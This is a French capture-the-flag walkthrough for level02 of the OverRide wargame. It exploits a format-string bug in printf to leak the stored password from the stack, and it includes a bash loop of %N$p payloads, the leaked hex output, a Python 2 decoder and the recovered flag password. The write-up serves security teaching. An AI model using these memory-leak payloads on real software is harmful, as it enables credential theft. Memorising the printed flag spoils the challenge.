# Walkthrough Level02 – OverRide

## 🔍 Objectif

Trouver le mot de passe de l'utilisateur `level03` en exploitant une vulnérabilité de format string dans le binaire `level02`.

---

## 🧠 Analyse du binaire

Le programme effectue les actions suivantes :

- Lit le mot de passe dans le fichier `/home/users/level03/.pass` via `fread`.
- Demande un **username** et un **password** à l'utilisateur.
- Compare le mot de passe saisi à celui du fichier avec `strncmp(local_a8, local_118, 0x29)`.
- Si le mot de passe est correct, lance `system("/bin/sh")`.
- Sinon, affiche une ligne contenant la chaîne username passée **via un `printf()` non sécurisé** :

```c
printf(local_78); // DANGER : format string vulnérable
```

---

## 🧪 Étapes d'exploitation

### 1. Chercher la position du mot de passe dans la stack

```bash
for i in $(seq 1 50); do
    ./level02 <<< "$(python -c 'print("%%%d$p" % '"$i"')')" | grep 'does';
done
```

Résultat intéressant :

```
22 - 0x756e505234376848
23 - 0x45414a3561733951
24 - 0x377a7143574e6758
25 - 0x354a35686e475873
26 - 0x48336750664b394d
```

### 2. Reconstruction du mot de passe en Python 2

```bash
python -c 'print(
    "".join([
        "756e505234376848".decode("hex")[::-1],
        "45414a3561733951".decode("hex")[::-1],
        "377a7143574e6758".decode("hex")[::-1],
        "354a35686e475873".decode("hex")[::-1],
        "48336750664b394d".decode("hex")[::-1],
    ])
)'
```

Mot de passe obtenu :

```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
---


## 🧠 Résumé

- Vulnérabilité de format string (`printf(user_input)`).
- Lecture de la mémoire avec `%x$p`.
- Extraction des valeurs hexadécimales du mot de passe.
- Décodage du mot de passe avec Python.